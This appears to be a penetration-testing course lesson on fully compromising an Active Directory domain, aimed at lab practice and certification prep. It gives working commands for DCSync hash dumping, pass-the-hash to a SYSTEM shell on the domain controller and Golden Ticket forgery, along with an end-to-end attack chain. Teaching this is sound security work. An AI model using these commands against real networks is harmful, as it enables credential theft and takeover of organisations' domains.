# Active Directory Module — Lesson 5: Domain Domination (Capstone)

**Methodology phase:** Post-exploitation → total domain compromise, then reporting.
**Why it matters for PT1:** this is the win condition of the AD section — reaching **Domain Admin** and proving it by owning the domain's secrets. It's also the capstone of the whole course: it chains recon, pivoting, roasting, BloodHound, and lateral movement into one engagement, exactly as the exam does.

**The finish line:** dump the domain's password database (or forge tickets to persist), grab the flags, and write it up.

---

## 1. DCSync — dump every hash in the domain

Once you control an account with directory-replication rights (`GetChanges` + `GetChangesAll` — Domain Admins have this, and BloodHound flags anyone else who does), you can ask the DC to hand over **every** account's hash by impersonating another DC. This is **DCSync**.

**With impacket-secretsdump:**
```bash
impacket-secretsdump corp.local/backupadmin:'NewPass123!'@dc01.corp.local -just-dc
impacket-secretsdump -hashes ':<nthash>' corp.local/backupadmin@dc01.corp.local -just-dc
```
- `-just-dc` — perform DCSync: pull the domain's NTDS credentials (all users' NT hashes, plus `krbtgt`) without touching disk on the DC.
- Add `-just-dc-user Administrator` to target just one account if you only need the DA hash.

**With Mimikatz** (on-host, as a privileged user):
```
lsadump::dcsync /domain:corp.local /user:Administrator
```

The output includes the **`Administrator`** NT hash and the **`krbtgt`** hash. The Administrator hash is your Domain Admin key (pass-the-hash straight onto the DC). The `krbtgt` hash enables Golden Tickets (persistence — Section 3).

---

## 2. Prove Domain Admin — own the DC

With the Administrator hash from DCSync, get a SYSTEM shell on the Domain Controller:
```bash
impacket-psexec -hashes ':<admin_nthash>' corp.local/Administrator@dc01.corp.local
# or
evil-winrm -i dc01.corp.local -u Administrator -H <admin_nthash>
```
`whoami` → `nt authority\system` on the DC. **You own the domain.** Grab the flags (typically on the Administrator's desktop and/or the DC): `type C:\Users\Administrator\Desktop\root.txt`.

---

## 3. Golden Ticket — persistence (know it, use if needed)

The `krbtgt` hash signs *all* Kerberos tickets in the domain. With it you can forge a **Golden Ticket**: a TGT for any user (including a fake Domain Admin) that the domain will accept, surviving password changes of normal accounts.
```
# Mimikatz
kerberos::golden /user:FakeAdmin /domain:corp.local /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt
```
- `/ptt` — pass-the-ticket: inject it into the current session immediately.
On PT1 you usually don't *need* persistence to pass, but understanding the `krbtgt` → Golden Ticket relationship is core AD knowledge and worth a mention in the report's impact section.

## 4. The full attack chain (capstone view)

This is the entire course in one flow — the shape of a PT1 engagement end to end:

```
RECON        nmap the perimeter host, find the web app          (Network L1, Web module)
FOOTHOLD     exploit the web app -> shell as a service account  (Web L4 / Network L2)
PRIVESC      SeImpersonate -> PrintSpoofer -> SYSTEM             (Network L4)
             loot local creds; box is domain-joined
PIVOT        Ligolo route to the internal AD subnet             (Network L5)
AD ENUM      nxc/ldap map users, groups, policy                 (AD L1)
CRED ACCESS  Kerberoast svc-sql, crack offline                  (AD L2)
PATHING      BloodHound: svc-sql -GenericAll-> backupadmin -DA  (AD L3)
LATERAL      reset backupadmin / pass-the-hash between hosts    (AD L4)
DOMINATION   DCSync -> Administrator + krbtgt -> own the DC      (AD L5)
REPORT       write every step with flags, CVSS, remediation     (Reporting module)
```

Notice the sections interlock: the Windows privesc from the Network module is the same skill used on AD hosts; the pivot bridges them; the report runs alongside the whole thing. That interlock is exactly why reviewers note "even the AD section contained web apps" — the skills don't stay in their lanes.

## 5. Worked example — foothold to Domain Admin

Room: **[TryHackMe — Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)** (single-DC practice) → then a multi-machine range like *Throwback*/*Holo* for the full chain.

1. **Enumerate & AS-REP roast** (no creds): `impacket-GetNPUsers` finds `svc-helpdesk` with pre-auth disabled; crack it (`hashcat -m 18200`).
2. **Authenticated enum:** `nxc smb DC -u svc-helpdesk -p <cracked> --users`; `bloodhound-python -c all`.
3. **BloodHound path:** `svc-helpdesk` → `WriteDACL` on a group → that group is `AdminTo` the DC.
4. **Abuse the ACL** (grant self rights, add to group), then `impacket-secretsdump ... -just-dc-user Administrator` via the now-privileged account.
5. **Pass-the-hash to the DC:** `impacket-psexec -hashes ':<admin_hash>' corp.local/Administrator@dc01` → SYSTEM.
6. **Grab flags**, then write the AD section of the report — each hop is a finding with its flag.

> **Dead end kept in:** DCSync failed with `DRSR SessionError ... rights not held` because I ran it before the ACL abuse actually applied — group membership changes need a fresh authentication (new ticket) to take effect. Re-authenticating (new nxc/impacket session) picked up the new rights and DCSync worked. Lesson: after changing your own privileges in AD, re-auth before using them.
